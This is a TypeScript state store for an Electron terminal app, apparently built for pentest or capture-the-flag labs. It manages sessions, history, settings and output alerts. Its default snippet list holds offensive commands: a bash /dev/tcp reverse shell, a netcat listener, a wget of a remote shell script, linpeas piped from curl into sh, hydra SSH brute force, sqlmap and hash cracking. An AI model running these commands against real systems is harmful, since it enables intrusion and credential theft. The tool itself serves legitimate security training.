// TerminalLink — Zustand store

import { create } from 'zustand'
import type { CommandEntry } from '@shared/types'
import type {
  TerminalSession,
  SharedContext,
  TerminalSettings,
  ActiveView,
  Snippet,
  SshProfile,
  RecordedSession,
  AppTheme,
} from '../types/terminallink'

const DEFAULT_KEYBINDINGS = {
  newSession:       'Ctrl+Shift+T',
  closeTab:         'Ctrl+Shift+W',
  nextTab:          'Ctrl+Tab',
  prevTab:          'Ctrl+Shift+Tab',
  splitView:        'Ctrl+Shift+D',
  toggleBroadcast:  'Ctrl+Shift+B',
  toggleHistory:    'Ctrl+Shift+H',
  commandPalette:   'Cmd+Shift+P',
  terminalSearch:   'Ctrl+F',
}

const DEFAULT_ALERTS = [
  { id: 'cve',   pattern: 'CVE-\\d{4}-\\d+',              label: 'CVE Detected',    notificationType: 'visual' as const, enabled: true },
  { id: 'root',  pattern: '\\[sudo\\]|root@|# $',          label: 'Root Shell',      notificationType: 'visual' as const, enabled: true },
  { id: 'error', pattern: 'Error:|FAILED|permission denied', label: 'Error Detected', notificationType: 'visual' as const, enabled: false },
]

const DEFAULT_APP_THEME: AppTheme = {
  accentColor: '#00ff41',
  bgColor: '#0a0a0f',
  textColor: '#e2e8f0',
}

const DEFAULT_SETTINGS: TerminalSettings = {
  shellPath: '/bin/zsh',
  fontSize: 13,
  cursorStyle: 'block',
  scrollbackLines: 5000,
  autoInjectTarget: true,
  showContextBar: true,
  autoLinkSession: true,
  maxHistoryEntries: 5000,
  outputAlerts: DEFAULT_ALERTS,
  keybindings: DEFAULT_KEYBINDINGS,
  ollamaUrl: 'http://localhost:11434',
  ollamaEnabled: false,
  snippetsOpen: false,
  appTheme: DEFAULT_APP_THEME,
  // External shell hook OFF by default; user must opt in via Settings.
  externalShellHook: {
    enabled: false,
    shells: ['zsh'],
  },
}

const DEFAULT_SNIPPETS: Snippet[] = [
  { id: 's1',  title: 'nmap quick scan',       command: 'nmap -sV -sC -oN scan.txt $TARGET_IP',                                          category: 'nmap' },
  { id: 's2',  title: 'nmap full port scan',   command: 'nmap -p- -T4 --open -oN full.txt $TARGET_IP',                                    category: 'nmap' },
  { id: 's3',  title: 'nmap UDP scan',         command: 'sudo nmap -sU -T4 --top-ports 200 $TARGET_IP',                                   category: 'nmap' },
  { id: 's4',  title: 'nmap vuln scripts',     command: 'nmap --script vuln -oN vuln.txt $TARGET_IP',                                     category: 'nmap' },
  { id: 's5',  title: 'gobuster dir',          command: 'gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt',       category: 'web' },
  { id: 's6',  title: 'gobuster vhost',        command: 'gobuster vhost -u http://$TARGET -w /usr/share/wordlists/subdomains.txt',         category: 'web' },
  { id: 's7',  title: 'ffuf fuzz',             command: 'ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$TARGET_IP/FUZZ',          category: 'web' },
  { id: 's8',  title: 'sqlmap basic',          command: 'sqlmap -u "http://$TARGET_IP/page?id=1" --dbs',                                   category: 'web' },
  { id: 's9',  title: 'netcat listen',         command: 'nc -lvnp 4444',                                                                   category: 'shell' },
  { id: 's10', title: 'netcat connect',        command: 'nc $TARGET_IP 4444',                                                              category: 'shell' },
  { id: 's11', title: 'john crack',            command: 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',                       category: 'crack' },
  { id: 's12', title: 'hashcat md5',           command: 'hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt',                         category: 'crack' },
  { id: 's13', title: 'curl headers',          command: 'curl -I -s http://$TARGET_IP',                                                    category: 'enum' },
  { id: 's14', title: 'wget file',             command: 'wget http://$TARGET_IP:8000/shell.sh -O /tmp/shell.sh',                           category: 'transfer' },
  { id: 's15', title: 'python http server',    command: 'python3 -m http.server 8000',                                                     category: 'transfer' },
  { id: 's16', title: 'SMB enum',             command: 'smbclient -L //$TARGET_IP -N',                                                    category: 'enum' },
  { id: 's17', title: 'linpeas download+run', command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', category: 'privesc' },
  { id: 's18', title: 'find SUID binaries',   command: 'find / -perm -4000 -type f 2>/dev/null',                                          category: 'privesc' },
  { id: 's19', title: 'reverse shell bash',   command: 'bash -i >& /dev/tcp/$TARGET_IP/4444 0>&1',                                        category: 'shell' },
  { id: 's20', title: 'hydra ssh brute',      command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP',              category: 'crack' },
]

interface TerminalLinkState {
  sessions: TerminalSession[]
  activeSessionId: string | null
  commandHistory: CommandEntry[]
  sharedContext: SharedContext | null
  activeView: ActiveView
  historyPanelOpen: boolean
  splitModeEnabled: boolean
  searchQuery: string
  settings: TerminalSettings
  broadcastMode: boolean
  snippets: Snippet[]
  sshProfiles: SshProfile[]
  recordedSessions: RecordedSession[]
  snippetsPanelOpen: boolean
  activeAlerts: string[]
  commandPaletteOpen: boolean
  toolLauncherOpen: boolean

  createSession: () => TerminalSession
  removeSession: (id: string) => void
  setActiveSession: (id: string) => void
  renameSession: (id: string, name: string) => void
  setSessionColor: (id: string, color: TerminalSession['color']) => void
  setSessionTheme: (id: string, theme: TerminalSession['theme']) => void
  addCommand: (cmd: Omit<CommandEntry, 'id' | 'sessionId' | 'timestamp'> & { timestamp?: string }) => void
  exportHistory: () => Promise<void>
  setSharedContext: (ctx: SharedContext) => void
  toggleHistoryPanel: () => void
  toggleSplitMode: () => void
  setSearchQuery: (q: string) => void
  setActiveView: (view: ActiveView) => void
  updateSettings: (patch: Partial<TerminalSettings>) => void
  clearHistory: () => void
  loadSharedContext: () => Promise<void>
  persistHistory: (entries: CommandEntry[]) => Promise<void>
  toggleBroadcastMode: () => void
  addSnippet: (s: Omit<Snippet, 'id'>) => void
  updateSnippet: (id: string, patch: Partial<Snippet>) => void
  removeSnippet: (id: string) => void
  addSshProfile: (p: Omit<SshProfile, 'id'>) => void
  updateSshProfile: (id: string, patch: Partial<SshProfile>) => void
  removeSshProfile: (id: string) => void
  addRecordedSession: (s: RecordedSession) => void
  toggleSnippetsPanel: () => void
  pushAlert: (msg: string) => void
  dismissAlert: (msg: string) => void
  setCommandPaletteOpen: (v: boolean) => void
  setToolLauncherOpen: (v: boolean) => void
}

function genId(): string {
  return `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
}

function buildSessionName(ctx: SharedContext | null): string {
  if (ctx?.activeLab) return ctx.activeLab
  const now = new Date()
  return `Session ${now.toLocaleDateString()} ${now.toLocaleTimeString()}`
}

export const useTerminalLinkStore = create<TerminalLinkState>((set, get) => ({
  sessions: [],
  activeSessionId: null,
  commandHistory: [],
  sharedContext: null,
  activeView: 'terminal',
  historyPanelOpen: false,
  splitModeEnabled: false,
  searchQuery: '',
  settings: DEFAULT_SETTINGS,
  broadcastMode: false,
  snippets: DEFAULT_SNIPPETS,
  sshProfiles: [],
  recordedSessions: [],
  snippetsPanelOpen: false,
  activeAlerts: [],
  commandPaletteOpen: false,
  toolLauncherOpen: false,

  createSession: () => {
    const { sharedContext, sessions } = get()
    const session: TerminalSession = {
      id: genId(),
      name: buildSessionName(sharedContext),
      linkedLabSession: sharedContext?.activeLab,
      targetName: sharedContext?.activeTarget,
      targetIP: sharedContext?.activeIP,
      startedAt: new Date().toISOString(),
      commandCount: 0,
      color: '#00ff41',
      theme: 'default',
    }
    set({ sessions: [...sessions, session], activeSessionId: session.id })
    return session
  },

  removeSession: (id) => {
    const { sessions, activeSessionId } = get()
    const remaining = sessions.filter(s => s.id !== id)
    const newActive = activeSessionId === id
      ? (remaining[remaining.length - 1]?.id ?? null)
      : activeSessionId
    set({ sessions: remaining, activeSessionId: newActive })
  },

  setActiveSession: (id) => set({ activeSessionId: id }),

  renameSession: (id, name) =>
    set(s => ({ sessions: s.sessions.map(sess => sess.id === id ? { ...sess, name } : sess) })),

  setSessionColor: (id, color) =>
    set(s => ({ sessions: s.sessions.map(sess => sess.id === id ? { ...sess, color } : sess) })),

  setSessionTheme: (id, theme) =>
    set(s => ({ sessions: s.sessions.map(sess => sess.id === id ? { ...sess, theme } : sess) })),

  addCommand: (payload) => {
    const { commandHistory, activeSessionId, sessions, settings } = get()
    const entry: CommandEntry = {
      id: genId(),
      sessionId: activeSessionId ?? undefined,
      timestamp: payload.timestamp ?? new Date().toISOString(),
      source: 'pane',
      ...payload,
    }
    const maxEntries = settings.maxHistoryEntries
    const updated = [...commandHistory, entry]
    const trimmed = maxEntries > 0 && updated.length > maxEntries
      ? updated.slice(updated.length - maxEntries)
      : updated
    const updatedSessions = sessions.map(s =>
      s.id === activeSessionId ? { ...s, commandCount: s.commandCount + 1 } : s
    )
    set({ commandHistory: trimmed, sessions: updatedSessions })
    get().persistHistory([entry]).catch(console.error)
  },

  setSharedContext: (ctx) => set({ sharedContext: ctx }),
  toggleHistoryPanel: () => set(s => ({ historyPanelOpen: !s.historyPanelOpen })),
  toggleSplitMode: () => set(s => ({ splitModeEnabled: !s.splitModeEnabled })),
  setSearchQuery: (q) => set({ searchQuery: q }),
  setActiveView: (view) => set({ activeView: view }),
  updateSettings: (patch) => set(s => ({ settings: { ...s.settings, ...patch } })),
  clearHistory: () => set({ commandHistory: [] }),

  loadSharedContext: async () => {
    try {
      const ctx = await window.electronAPI.getSessionContext()
      set({
        sharedContext: {
          activeLab: ctx.activeLab,
          activeTarget: ctx.activeTarget,
          activeIP: ctx.activeIP,
          sessions: ctx.sessions,
        },
      })
    } catch (e) {
      console.error('[TerminalLinkStore] loadSharedContext error:', e)
    }
  },

  persistHistory: async (entries) => {
    try {
      await window.electronAPI.logCommands(entries)
    } catch (e) {
      console.error('[TerminalLinkStore] persistHistory error:', e)
    }
  },

  exportHistory: async () => {
    const { commandHistory } = get()
    const text = commandHistory.map(c =>
      `[${c.timestamp}] [${c.pane}] ${c.command}${c.outputSnippet ? `\n  > ${c.outputSnippet}` : ''}`
    ).join('\n')
    try {
      await window.electronAPI.exportHistory(text)
    } catch (e) {
      console.error('[TerminalLinkStore] exportHistory error:', e)
    }
  },

  toggleBroadcastMode: () => set(s => ({ broadcastMode: !s.broadcastMode })),

  addSnippet: (s) => set(st => ({ snippets: [...st.snippets, { ...s, id: genId() }] })),
  updateSnippet: (id, patch) =>
    set(s => ({ snippets: s.snippets.map(sn => sn.id === id ? { ...sn, ...patch } : sn) })),
  removeSnippet: (id) =>
    set(s => ({ snippets: s.snippets.filter(sn => sn.id !== id) })),

  addSshProfile: (p) => set(s => ({ sshProfiles: [...s.sshProfiles, { ...p, id: genId() }] })),
  updateSshProfile: (id, patch) =>
    set(s => ({ sshProfiles: s.sshProfiles.map(p => p.id === id ? { ...p, ...patch } : p) })),
  removeSshProfile: (id) =>
    set(s => ({ sshProfiles: s.sshProfiles.filter(p => p.id !== id) })),

  addRecordedSession: (s) =>
    set(st => ({ recordedSessions: [...st.recordedSessions, s] })),

  toggleSnippetsPanel: () => set(s => ({ snippetsPanelOpen: !s.snippetsPanelOpen })),

  pushAlert: (msg) => set(s => ({ activeAlerts: [...s.activeAlerts, msg] })),
  dismissAlert: (msg) => set(s => ({ activeAlerts: s.activeAlerts.filter(a => a !== msg) })),
  setCommandPaletteOpen: (v) => set({ commandPaletteOpen: v }),
  setToolLauncherOpen: (v) => set({ toolLauncherOpen: v }),
}))
